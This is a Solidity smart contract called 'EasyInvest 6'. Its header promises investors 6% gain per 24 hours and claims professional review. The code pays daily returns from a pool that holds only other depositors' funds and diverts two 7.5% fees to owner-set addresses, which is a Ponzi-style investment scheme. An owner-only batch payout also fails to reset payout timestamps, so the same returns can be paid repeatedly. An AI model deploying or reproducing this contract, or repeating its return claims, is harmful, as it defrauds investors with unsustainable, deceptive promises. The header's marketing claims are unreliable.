1 pragma solidity ^0.4.23;
2 
3 /**
4  * EasyInvest 6 Contract
5  *  - GAIN 6% PER 24 HOURS
6  *  - STRONG MARKETING SUPPORT  
7  *  - NEW BETTER IMPROVEMENTS
8  * How to use:
9  *  1. Send any amount of ether to make an investment;
10  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS);
11  *  OR
12  *  2b. Send more ether to reinvest AND get your profit at the same time;
13  *
14  * RECOMMENDED GAS LIMIT: 200000
15  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
16  *
17  * Contract is reviewed and approved by professionals!
18  */
19 
20 /**
21  * @title SafeMath
22  * @dev Math operations with safety checks that revert on error
23  */
24 library SafeMath {
25 
26   /**
27   * @dev Multiplies two numbers, reverts on overflow.
28   */
29   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
30     // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
31     // benefit is lost if 'b' is also tested.
32     // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
33     if (a == 0) {
34       return 0;
35     }
36 
37     uint256 c = a * b;
38     require(c / a == b);
39 
40     return c;
41   }
42 
43   /**
44   * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
45   */
46   function div(uint256 a, uint256 b) internal pure returns (uint256) {
47     require(b > 0); // Solidity only automatically asserts when dividing by 0
48     uint256 c = a / b;
49     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
50 
51     return c;
52   }
53 
54   /**
55   * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
56   */
57   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
58     require(b <= a);
59     uint256 c = a - b;
60 
61     return c;
62   }
63 
64   /**
65   * @dev Adds two numbers, reverts on overflow.
66   */
67   function add(uint256 a, uint256 b) internal pure returns (uint256) {
68     uint256 c = a + b;
69     require(c >= a);
70 
71     return c;
72   }
73 
74   /**
75   * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
76   * reverts when dividing by zero.
77   */
78   function mod(uint256 a, uint256 b) internal pure returns (uint256) {
79     require(b != 0);
80     return a % b;
81   }
82 }
83 
84 /**
85  * @title Ownable
86  * @dev The Ownable contract has an owner address, and provides basic authorization control
87  * functions, this simplifies the implementation of "user permissions".
88  */
89 contract Ownable {
90   address public owner;
91 
92 
93   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
94 
95 
96   /**
97    * @dev The Ownable constructor sets the original `owner` of the contract to the sender
98    * account.
99    */
100   constructor () public {
101     owner = msg.sender;
102   }
103 
104   /**
105    * @dev Throws if called by any account other than the owner.
106    */
107   modifier onlyOwner() {
108     require(msg.sender == owner);
109     _;
110   }
111 
112   /**
113    * @dev Allows the current owner to transfer control of the contract to a newOwner.
114    * @param newOwner The address to transfer ownership to.
115    */
116   function transferOwnership(address newOwner) public onlyOwner {
117     require(newOwner != address(0));
118     emit OwnershipTransferred(owner, newOwner);
119     owner = newOwner;
120   }
121 
122 }
123 
124 contract EasyInvest6 is Ownable
125 {   
126     using SafeMath for uint;
127     
128     mapping (address => uint) public invested;
129     mapping (address => uint) public lastInvest;
130     address[] public investors;
131     
132     address private m1;
133     address private m2;
134     
135     
136     function getInvestorsCount() public view returns(uint) 
137     {   
138         return investors.length;
139     }
140     
141     function () external payable 
142     {   
143         if(msg.value > 0) 
144         {   
145             require(msg.value >= 10 finney, "require minimum 0.01 ETH"); // min 0.01 ETH
146             
147             uint fee = msg.value.mul(7).div(100).add(msg.value.div(200)); // 7.5%;            
148             if(m1 != address(0)) m1.transfer(fee);
149             if(m2 != address(0)) m2.transfer(fee);
150         }
151     
152         payWithdraw(msg.sender);
153         
154         if (invested[msg.sender] == 0) 
155         {
156             investors.push(msg.sender);
157         }
158         
159         lastInvest[msg.sender] = now;
160         invested[msg.sender] += msg.value;
161     }
162     
163     function getNumberOfPeriods(uint startTime, uint endTime) public pure returns (uint)
164     {
165         return endTime.sub(startTime).div(1 days);
166     }
167     
168     function getWithdrawAmount(uint investedSum, uint numberOfPeriods) public pure returns (uint)
169     {
170         return investedSum.mul(6).div(100).mul(numberOfPeriods);
171     }
172     
173     function payWithdraw(address to) internal
174     {
175         if (invested[to] != 0) 
176         {
177             uint numberOfPeriods = getNumberOfPeriods(lastInvest[to], now);
178             uint amount = getWithdrawAmount(invested[to], numberOfPeriods);
179             to.transfer(amount);
180         }
181     }
182     
183     function batchWithdraw(address[] to) onlyOwner public 
184     {
185         for(uint i = 0; i < to.length; i++)
186         {
187             payWithdraw(to[i]);
188         }
189     }
190     
191     function batchWithdraw(uint startIndex, uint length) onlyOwner public 
192     {
193         for(uint i = startIndex; i < length; i++)
194         {
195             payWithdraw(investors[i]);
196         }
197     }
198     
199     function setM1(address addr) onlyOwner public 
200     {
201         m1 = addr;
202     }
203     
204     function setM2(address addr) onlyOwner public 
205     {
206         m2 = addr;
207     }
208 }